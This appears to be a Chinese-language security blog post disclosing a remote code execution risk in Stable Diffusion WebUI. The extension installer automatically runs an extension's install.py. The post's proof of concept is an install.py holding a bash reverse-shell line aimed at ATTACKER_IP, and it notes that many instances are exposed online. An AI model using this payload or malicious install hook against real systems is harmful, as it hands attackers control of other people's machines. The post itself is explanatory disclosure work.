---
title: Stable Diffusion WebUI RCE Vulnerability
date: 2023-04-23T19:50:08+08:00
draft: false
url: "/2023/04/23/stable-diffusion-webui-rce-vulnerabilitiy/"
categories:
  - 資訊安全
  - 網頁安全
showToc: true
TocOpen: false
---

目前最有名的 Stable Diffusion GUI 程式是由 [AUTOMATIC1111](https://github.com/AUTOMATIC1111/stable-diffusion-webui) 開發的  
[stable-diffusion-webui](https://github.com/AUTOMATIC1111/stable-diffusion-webui) ，它強大且多功能的介面，吸引了非常多人的使用。

![](https://i.imgur.com/OXr0bk1.png)

Stable Diffusion Web UI 支援透過 Extension 功能安裝第三方的套件，使用者僅需貼上對應的 GitHub Repository 即可安裝對應的套件。

![](https://i.imgur.com/YD3GOdL.png)

透過這種方式安裝套件非常方便，但也有嚴重的安全隱患。這些套件都是透過 Python 撰寫而成，因此，駭客也可以自行準備一個惡意的腳本，並透過該 UI 載入，即可達成遠端指令執行 (RCE)。

Stable Diffusion Web UI 的套件格式為，一個 `install.py` 的腳本進行安裝相關操作，而主要的腳本則放在 `scripts` 資料夾中。而初次引入腳本的瞬間，系統會自動執行 `install.py` 的程式碼。因此，如果攻擊者準備好一個包含惡意腳本的 Repository，並引入，即可控制遠端的系統。

舉例來說，我們可以建立一個 Github Repository，並單純只放入 `install.py`，裡面寫入一個 Reverse Shell 的腳本。

```
import os

os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/8787 0>&1' &")
```

並操作 Stable Diffusion Web UI 進行引入的動作，當按下引入後，攻擊者的 IP 即可收到一個 Reverse Shell，也就代表我們已經順利的駭入這台電腦或伺服器了！

![](https://i.imgur.com/Y8s1TEX.png)

- Demo: https://www.youtube.com/watch?v=yyjeMs1R8Ew

其實，這套 Web UI 預設是開在 127.0.0.1 僅供本地使用，不過許多人為了遠端存取，或是多人共用，因此將其直接開在廣域網路上。可怕的事情是，只要對整個網際網路開啟了 Web UI，駭客就可以輕易地奪走使用者的電腦或是伺服器！

透過 Shodan 或是 Fofa 等搜尋引擎更可以發現，數以千計的伺服器正開啟著這樣的服務對外，影響層面可能比想像中還要大。

![](https://i.imgur.com/Q01yxm1.png)
